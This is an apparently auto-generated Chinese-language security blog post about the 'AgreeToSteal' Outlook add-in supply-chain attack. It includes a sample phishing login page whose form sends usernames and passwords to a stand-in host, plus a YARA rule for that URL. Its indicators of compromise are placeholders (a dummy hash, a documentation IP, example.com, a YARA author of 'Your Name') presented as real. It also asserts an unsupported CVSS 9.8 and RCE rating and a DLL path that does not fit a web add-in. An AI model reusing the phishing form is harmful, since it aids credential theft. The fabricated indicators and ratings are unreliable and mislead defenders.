---
layout: post
title:  "First Malicious Outlook Add-In Found Stealing 4,000+ Microsoft Credentials"
date:   2026-02-12 01:29:24 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Microsoft Outlook Add-in 的供應鏈攻擊：AgreeToSteal
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和 Info Leak
> * **關鍵技術**: Supply Chain Attack, Phishing, JavaScript Injection

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Microsoft Outlook Add-in 的供應鏈攻擊是因為 Add-in 的 manifest 文件中宣告的 URL 可以在 Add-in 被安裝後被修改，而 Microsoft 的審核機制並不會在 Add-in 被安裝後繼續監控這個 URL 的內容。
* **攻擊流程圖解**:
  1. 攻擊者取得一個已經被棄用的 Add-in 的域名。
  2. 攻擊者在這個域名上架設一個假的 Microsoft 登入頁面。
  3. 使用者安裝了 AgreeTo Add-in，當使用者打開 Outlook 時，Add-in 會從攻擊者的域名下載內容。
  4. 攻擊者可以透過這個假的登入頁面竊取使用者的登入資訊。
* **受影響元件**: Microsoft Outlook 2013 或更新版本，AgreeTo Add-in。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要取得一個已經被棄用的 Add-in 的域名，並架設一個假的 Microsoft 登入頁面。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 假的 Microsoft 登入頁面
    const phishingPage = `
      <html>
        <body>
          <h1>Microsoft 登入</h1>
          <form action="https://example.com/steal-credentials" method="post">
            <input type="text" name="username" placeholder="使用者名稱">
            <input type="password" name="password" placeholder="密碼">
            <button type="submit">登入</button>
          </form>
        </body>
      </html>
    `;
    
    ```
* **繞過技術**: 攻擊者可以使用 JavaScript Injection 技術來繞過 Outlook 的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.0.2.1 | example.com | C:\Users\username\AppData\Local\Microsoft\Outlook\AddIns\AgreeTo.dll |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule AgreeTo_Phishing {
      meta:
        description = "AgreeTo Phishing Detection"
        author = "Your Name"
      strings:
        $phishing_page = { 68 74 74 70 3a 2f 2f 65 78 61 6d 70 6c 65 2e 63 6f 6d 2f 73 74 65 61 6c 2d 63 72 65 64 65 6e 74 69 61 6c 73 }
      condition:
        $phishing_page at 0
    }
    
    ```
* **緩解措施**: 使用者應該立即移除 AgreeTo Add-in，並更新 Outlook 至最新版本。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Supply Chain Attack (供應鏈攻擊)**: 一種攻擊方式，攻擊者透過攻擊供應鏈中的弱點來取得目標系統的存取權。
* **Phishing (釣魚攻擊)**: 一種攻擊方式，攻擊者透過假的登入頁面或電子郵件來竊取使用者的登入資訊。
* **JavaScript Injection (JavaScript 注入)**: 一種攻擊方式，攻擊者透過注入惡意的 JavaScript 代碼來取得目標系統的存取權。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/first-malicious-outlook-add-in-found.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


